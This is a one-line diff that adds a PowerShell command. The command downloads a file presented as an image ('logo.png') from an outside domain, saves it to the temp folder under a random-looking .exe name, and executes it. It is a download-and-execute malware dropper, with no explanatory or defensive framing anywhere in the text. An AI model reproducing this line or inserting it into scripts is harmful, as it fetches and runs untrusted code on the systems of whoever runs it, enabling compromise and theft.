@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://doc.cherrycoffeeequipment.com/nw/logo.png',"$env:TEMPgrtsndebdgfsytewrw.exe");Start-Process ("$env:TEMPgrtsndebdgfsytewrw.exe")
